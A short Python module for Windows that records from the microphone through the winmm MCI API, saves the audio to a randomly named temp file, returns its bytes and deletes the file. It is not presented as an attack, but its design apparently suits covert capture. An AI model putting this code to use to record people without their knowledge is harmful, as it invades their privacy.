#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author github.com/L1ghtM4n

__all__ = ["MicrophoneRecorder"]

# Import modules
from ctypes import windll
from random import sample
from string import ascii_letters
from os import path, getenv, remove

# WinApi function
mciSendString = windll.winmm.mciSendStringW
# Temp file location
tempfile = path.abspath(path.join(getenv("TEMP"), "".join(sample(ascii_letters * 12, 12)) + ".wav"))

""" Main class """
class MicrophoneRecorder:

    """ Start recording """
    def StartRecording() -> bool:
        a = mciSendString("open new Type waveaudio Alias recsound", "", 0, 0)
        b = mciSendString("record recsound", "", 0, 0)
        return a == 0 and b == 0

    """ Stop recording """
    def StopRecording() -> bool:
        a = mciSendString("save recsound " + tempfile, "", 0, 0)
        b = mciSendString("close recsound ", "", 0, 0)
        return a == 0 and b == 0

    """ Get bytes """
    def GetBytes() -> bytes:
        data = b""
        if path.exists(tempfile):
            with open(tempfile, "rb") as file:
                data = file.read()
            remove(tempfile)
        return data

